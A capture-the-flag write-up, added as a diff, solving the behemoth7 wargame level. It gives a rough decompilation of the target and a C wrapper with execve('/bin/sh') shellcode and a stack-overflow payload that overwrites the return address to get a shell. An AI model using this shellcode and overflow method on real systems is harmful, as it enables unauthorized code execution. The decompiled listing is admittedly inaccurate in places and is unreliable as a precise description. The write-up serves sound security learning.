@@ -1,0 +1,86 @@
+Last level of behemoth!
+
+This one ended up being a bit more complicated/confusing.
+There was one major oversight I made in the assembly that made the level
+appear significantly more hard than it actually was!
+
+So first, the program:
+								/behemoth/behemoth7
+		  ______________________________________________________________________________________________________________________________
+		 | int main(char **argv, char **envp, int argc)											|
+		 | {																|
+		 |     int len;															|
+		 |     int *locTable;														|
+		 |     char* bytes;														|
+		 |     int counter;														|
+		 |     int i;															|
+		 |     int stackP;														|
+		 |																|
+		 |     stackP = envp[1];								//Loop to wipe env variables		| 
+		 |     for (i = 0; *(int *)(argc + i * 4) != 0; i = i + 1) {				//get length of env var			| 
+		 |         len = strlen(*(File *)(argc + i * 4));					//wipe it with null bytes		| 
+		 |         memset(*(File *)(argc + i * 4), 0, len);										|
+		 |     }															|
+		 |     counter = 0;														|
+		 |     if (argc <= 1) {														|
+		 |         while ((*(char *)stackP != '\0' && (counter < 511))) { 			//Loop that runs 511 times...		| 
+		 |             counter = counter + 1;												|
+		 |             locTable = (int *)__ctype_b_loc(); 					//Get __ctype_b_loc table		| 
+		 |             if ((*(6_t *)(*(char *)stackP * 2 + *locTable) & 0x400) == 0) { 		//Check if letter (0x400)		| 
+		 |                 *(File *)((int)stack + -4) = 0x80485d7;									|
+		 |                 locTable = (int *)__ctype_b_loc();										|
+		 |                 if ((*(uint16_t *)(*(char *)stackP * 2 + *locTable) & 0x800) == 0) { //Check if numeric (0x800)		| 
+		 |                     fprintf(stderror, "Non-%s chars found in string, possible shellcode!\n");				|
+		 |                     *(File *)((int)stack + -4) = 1;					//Exit code 1				|
+		 |                     exit();													|
+		 |                 }														|
+		 |             }														|
+		 |             stackP = stackP + 1; 							//Inc to check next byte		|
+		 |         } 										//If the first 511 bytes are ok...	|
+		 |	   char* newStr;													|
+ 		 |         strcpy(newStr, bytes);							//Call strcpy				|
+ 		 |     }															|
+ 		 |     return 0; 									//Return ;)				| 
+ 		 | }																|
+ 		 |______________________________________________________________________________________________________________________________|
+
+Rough translation of a rough translation, some variable names will be inaccurate/improper and a lot of lines were deleted/changed.
+
+Either way, the comments reflect the general flow/execution of the program and what it is doing at those times.
+
+Essentially behemoth7 does a few things:
+ - Wipe the environment (no shellcode there!)
+ - Exit if argc > 1
+ - If not, check the first 511 bytes of argv[1]
+ - If one of those bytes is NOT alphanumeric, exit with an error message
+ - Otherwise, strcpy argv[1] into a new buffer (conveniently, next to the return statement)
+
+This essentially becomes a basic buffer overflow level though, once you understand the significance of the first 511 or so bytes.
+
+As such, we only need a few more things:
+ - Shellcode for execve('/bin/sh')
+ - Finding the position of bytes to alter the return address in the buffer overflow
+ - A wrapper program so we can keep the stack consistent
+
+Shellcode will be taken/altered from my narnia8 solve, as well as the wrapper:
+				
+						     b7wrapper.c (server version)
+			  ______________________________________________________________________________
+			 | #include <unistd.h>								|
+			 | 										|
+			 | int main(void) {								|
+			 | 	char *environment[2] = {"", 0};						|
+			 | 	char *payload = "Ax528							|
+			 | 	 \x20\xdc\xff\xff\x31\xc0\x31\xdb\x31\xc9\x31				|
+			 | 	 \xd2\x89\xe5\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e	|
+			 | 	 \x8d\x0c\x24\x31\xc0\x50\x51\x8b\x1c\x24\x89\xe1\xb0\x0b\xcd\x80";	|
+			 | 	char *argv[3] = {"/behemoth/behemoth7", payload, 0};			|
+			 | 	execve("/behemoth/behemoth7", argv, environment);			|
+			 | }										|
+			 |______________________________________________________________________________|
+
+ The payload is 528 A's, followed by 4 bytes for the 'new' return address, and lastly
+ the shellcode for execve(/bin/sh).
+
+ The new return address points to the start of the shellcode!
+ Adjusting the return address bytes on the server and executing the file, we get a shell!
